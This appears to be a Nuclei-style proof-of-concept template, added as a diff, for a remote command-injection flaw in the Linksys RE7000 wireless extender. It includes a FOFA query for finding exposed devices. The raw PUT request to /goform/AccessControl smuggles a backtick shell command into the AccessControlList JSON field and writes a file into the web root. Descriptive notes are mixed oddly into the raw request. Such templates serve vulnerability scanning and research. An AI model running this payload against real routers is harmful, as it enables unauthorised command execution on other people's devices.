@@ -1,0 +1,42 @@
+id: poc-eep3ek0rcgx0z9gt
+info:
+  name: Linksys RE7000 无线扩展器 AccessControl RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/eep3ek0rcgx0z9gt'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: eep3ek0rcgx0z9gt
+    fofa: body="/login.shtml?ran="
+http:
+- raw:
+  - 'PUT /goform/AccessControl HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+
+
+
+    {"AccessPolicy":"0","AccessControlList":"`echo dudesuite>/etc_ro/lighttpd/RE7000_www/dudesuite.txt`"}
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /dudesuite.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
